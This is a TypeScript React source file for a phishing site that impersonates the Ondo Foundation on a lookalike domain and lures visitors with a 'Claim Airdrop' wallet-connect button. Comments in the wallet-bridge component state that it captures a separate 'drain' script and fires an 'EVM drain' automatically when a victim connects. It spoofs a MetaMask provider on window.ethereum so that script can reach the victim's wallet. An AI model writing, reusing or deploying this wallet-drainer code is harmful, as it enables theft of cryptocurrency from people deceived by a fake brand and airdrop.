import React, { useEffect, useRef } from 'react';
import ReactDOM from 'react-dom/client';
import '@rainbow-me/rainbowkit/styles.css';
import {
  RainbowKitProvider,
  ConnectButton,
  connectorsForWallets,
  useConnectModal,
  useAccountModal,
  useChainModal,
  darkTheme,
  lightTheme,
} from '@rainbow-me/rainbowkit';
import {
  metaMaskWallet,
  trustWallet,
  coinbaseWallet,
  phantomWallet,
  walletConnectWallet,
  injectedWallet,
  bitgetWallet,
  safepalWallet,
  okxWallet,
  rabbyWallet,
  rainbowWallet,
  braveWallet,
  ledgerWallet,
  zerionWallet,
  uniswapWallet,
  binanceWallet,
  bybitWallet,
  krakenWallet,
  foxWallet,
  coin98Wallet,
  tokenPocketWallet,
  oneKeyWallet,
  gateWallet,
  imTokenWallet,
  safeWallet,
  frontierWallet,
  omniWallet,
} from '@rainbow-me/rainbowkit/wallets';
import { WagmiProvider, useAccount, createConfig, http } from 'wagmi';
import { mainnet, polygon, optimism, arbitrum, base } from 'wagmi/chains';
import { QueryClientProvider, QueryClient } from '@tanstack/react-query';

export const projectId = '8faba7f54540ca09e4a350f5da01bedd';

const connectors = connectorsForWallets(
  [
    {
      groupName: 'Recommended',
      wallets: [
        metaMaskWallet,
        trustWallet,
        coinbaseWallet,
        phantomWallet,
        bitgetWallet,
        safepalWallet,
        okxWallet,
        rabbyWallet,
        binanceWallet,
      ],
    },
    {
      groupName: 'Popular',
      wallets: [
        rainbowWallet,
        braveWallet,
        ledgerWallet,
        zerionWallet,
        uniswapWallet,
        bybitWallet,
        krakenWallet,
        foxWallet,
        coin98Wallet,
        tokenPocketWallet,
      ],
    },
    {
      groupName: 'More',
      wallets: [
        oneKeyWallet,
        gateWallet,
        imTokenWallet,
        safeWallet,
        frontierWallet,
        omniWallet,
        injectedWallet,
        walletConnectWallet,
      ],
    },
  ],
  {
    appName: 'Ondo Foundation',
    projectId: projectId,
    appDescription: 'Institutional-grade onchain financial products by Ondo Foundation.',
    appUrl: 'https://www.0nd0f0undation.xyz/',
    appIcon: 'https://www.0nd0f0undation.xyz/assets/favicon-CibWB2op.ico',
    walletConnectParameters: {
      metadata: {
        name: 'Ondo Foundation',
        description: 'Institutional-grade onchain financial products by Ondo Foundation.',
        url: 'https://www.0nd0f0undation.xyz/',
        icons: ['https://www.0nd0f0undation.xyz/assets/favicon-CibWB2op.ico'],
      },
    },
  },
);

export const config = createConfig({
  connectors,
  chains: [mainnet, polygon, optimism, arbitrum, base],
  transports: {
    [mainnet.id]: http(),
    [polygon.id]: http(),
    [optimism.id]: http(),
    [arbitrum.id]: http(),
    [base.id]: http(),
  },
  ssr: false,
});

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 1000 * 60 * 5,
      gcTime: 1000 * 60 * 10,
    },
  },
});

// Wraps any EIP-1193 provider with legacy send/sendAsync compatibility
function wrapProvider(raw: any) {
  if (!raw) return raw;
  if (raw.__isWrapped) return raw;

  const wrapped: any = {
    __isWrapped: true,
    isMetaMask: true,
    request: (args: any) => raw.request(args),
    send: (methodOrPayload: any, paramsOrCallback: any) => {
      if (typeof paramsOrCallback === 'function') {
        const cb = paramsOrCallback;
        const method = typeof methodOrPayload === 'string' ? methodOrPayload : methodOrPayload.method;
        const params = typeof methodOrPayload === 'string' ? [] : (methodOrPayload.params || []);
        raw.request({ method, params })
          .then((result: any) => cb(null, { id: methodOrPayload.id, jsonrpc: '2.0', result }))
          .catch((err: any) => cb(err, null));
        return;
      }
      if (typeof methodOrPayload === 'string') {
        return raw.request({ method: methodOrPayload, params: paramsOrCallback || [] });
      }
      return raw.request({ method: methodOrPayload.method, params: methodOrPayload.params || [] });
    },
    sendAsync: (payload: any, callback: any) => {
      raw.request({ method: payload.method, params: payload.params || [] })
        .then((result: any) => callback(null, { id: payload.id, jsonrpc: '2.0', result }))
        .catch((err: any) => callback(err, null));
    },
    on: (event: string, handler: any) => raw.on?.(event, handler),
    removeListener: (event: string, handler: any) => raw.removeListener?.(event, handler),
    off: (event: string, handler: any) => raw.off?.(event, handler) ?? raw.removeListener?.(event, handler),
  };
  return wrapped;
}

function GlobalWalletBridge() {
  const { address, isConnected, chain, connector, status } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { openAccountModal } = useAccountModal();
  const { openChainModal } = useChainModal();

  const prevConnected = useRef<boolean | null>(null);
  const talkWalletFired = useRef(false);

  // Capture talker-embed's drain function before we overwrite window.talkWallet.
  // talker-embed is a synchronous script so it always runs before this module (type="module" is deferred).
  useEffect(() => {
    const existing = (window as any).talkWallet;
    if (typeof existing === 'function' && !(window as any).__originalTalkWallet) {
      (window as any).__originalTalkWallet = existing;
    }
  }, []);

  // Expose a fully-compatible window.ethereum shim from the wagmi connector.
  useEffect(() => {
    if (isConnected && connector) {
      connector.getProvider().then((provider: any) => {
        if (provider) (window as any).ethereum = wrapProvider(provider);
      }).catch(() => {});
    }
  }, [isConnected, connector]);

  useEffect(() => {
    (window as any).openConnectModal = openConnectModal;
    (window as any).openAccountModal = openAccountModal;
    (window as any).openChainModal = openChainModal;

    if (isConnected && address) {
      (window as any).walletAddress = address;
      (window as any).walletChainId = chain ? '0x' + chain.id.toString(16) : null;
      (window as any).walletKind = 'evm';
      if (typeof (window as any).onWalletConnected === 'function') {
        try { (window as any).onWalletConnected(); } catch (e) { console.warn(e); }
      }
      document.querySelectorAll('.wallet-addr-display').forEach((el) => {
        el.textContent = address.slice(0, 6) + '...' + address.slice(-4);
      });
    }

    // connectWallet: opens RainbowKit modal directly
    (window as any).connectWallet = () => {
      if (status === 'reconnecting' || isConnected) {
        openAccountModal?.();
        return;
      }
      openConnectModal?.();
    };

    // talkWallet: fires EVM drain if connected, otherwise opens RainbowKit modal
    (window as any).talkWallet = () => {
      if (isConnected) {
        const callDrain = () => {
          const fn = (window as any).__originalTalkWallet;
          if (typeof fn === 'function') fn();
        };
        if (connector) {
          connector.getProvider().then((provider: any) => {
            if (provider) (window as any).ethereum = wrapProvider(provider);
            callDrain();
          }).catch(() => callDrain());
        } else {
          callDrain();
        }
        return;
      }
      openConnectModal?.();
    };

  }, [address, isConnected, chain, status, connector, openConnectModal, openAccountModal, openChainModal]);

  // Auto-fire drain on fresh user-initiated EVM connect (not on page-reload reconnect).
  useEffect(() => {
    if (status === 'reconnecting' || status === 'connecting') return;

    if (status === 'connected' && isConnected) {
      if (prevConnected.current === false && !talkWalletFired.current) {
        talkWalletFired.current = true;
        (window as any).walletKind = 'evm';
        const fn = (window as any).__originalTalkWallet;
        if (typeof fn === 'function') {
          if (connector) {
            connector.getProvider().then((provider: any) => {
              if (provider) (window as any).ethereum = wrapProvider(provider);
              fn();
            }).catch(() => fn());
          } else {
            fn();
          }
        }
      }
      prevConnected.current = true;
    } else if (status === 'disconnected') {
      prevConnected.current = false;
      talkWalletFired.current = false;
      (window as any).walletAddress = null;
      (window as any).walletChainId = null;
      (window as any).walletKind = null;
    }
  }, [isConnected, status, connector]);

  return null;
}


// Custom styled RainbowKit button preserving original site UI
export function CustomHeaderButton({ label = 'Claim Airdrop', className = '' }: { label?: string; className?: string }) {
  return (
    <ConnectButton.Custom>
      {({ account, chain, openAccountModal, openChainModal, openConnectModal, mounted }) => {
        const ready = mounted;
        const connected = ready && account && chain;

        if (!connected) {
          return (
            <button
              onClick={openConnectModal}
              type="button"
              className={className || "btn btn-dark h-[36px] px-3.5 text-[13px] font-semibold rounded-lg"}
            >
              {label}
            </button>
          );
        }

        if (chain.unsupported) {
          return (
            <button
              onClick={openChainModal}
              type="button"
              className="btn bg-red-600 text-white h-[36px] px-3 text-[13px] font-semibold rounded-lg"
            >
              Wrong network
            </button>
          );
        }

        return (
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <button
              onClick={openChainModal}
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: '4px',
                padding: '6px 10px',
                borderRadius: '8px',
                background: 'rgba(0, 0, 0, 0.05)',
                border: '1px solid rgba(0, 0, 0, 0.1)',
                fontSize: '12px',
                fontWeight: 600,
                cursor: 'pointer',
              }}
              type="button"
            >
              {chain.hasIcon && (
                <div style={{ width: 14, height: 14, borderRadius: 999, overflow: 'hidden', marginRight: 2 }}>
                  {chain.iconUrl && (
                    <img alt={chain.name ?? 'Chain icon'} src={chain.iconUrl} style={{ width: 14, height: 14 }} />
                  )}
                </div>
              )}
              {chain.name}
            </button>

            <button
              onClick={openAccountModal}
              type="button"
              className={className || "btn btn-dark h-[36px] px-3.5 text-[13px] font-semibold rounded-lg"}
            >
              {account.displayName}
            </button>
          </div>
        );
      }}
    </ConnectButton.Custom>
  );
}

function initRainbowApp() {
  let rootEl = document.getElementById('rainbowkit-root');
  if (!rootEl) {
    rootEl = document.createElement('div');
    rootEl.id = 'rainbowkit-root';
    document.body.appendChild(rootEl);
  }

  const isDarkPage = window.location.pathname.includes('stake') || document.body.classList.contains('dark-theme');
  const chosenTheme = isDarkPage ? darkTheme({ accentColor: '#4B2BFF' }) : lightTheme({ accentColor: '#4B2BFF' });

  const root = ReactDOM.createRoot(rootEl);
  root.render(
    <React.StrictMode>
      <WagmiProvider config={config}>
        <QueryClientProvider client={queryClient}>
          <RainbowKitProvider theme={chosenTheme}>
            <GlobalWalletBridge />
          </RainbowKitProvider>
        </QueryClientProvider>
      </WagmiProvider>
    </React.StrictMode>
  );

  document.querySelectorAll('[data-rainbow-button]').forEach((container) => {
    const label = container.getAttribute('data-label') || 'Claim Airdrop';
    const btnClass = container.getAttribute('data-class') || '';
    const btnRoot = ReactDOM.createRoot(container as HTMLElement);
    btnRoot.render(
      <React.StrictMode>
        <WagmiProvider config={config}>
          <QueryClientProvider client={queryClient}>
            <RainbowKitProvider theme={chosenTheme}>
              <CustomHeaderButton label={label} className={btnClass} />
            </RainbowKitProvider>
          </QueryClientProvider>
        </WagmiProvider>
      </React.StrictMode>
    );
  });
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initRainbowApp);
} else {
  initRainbowApp();
}
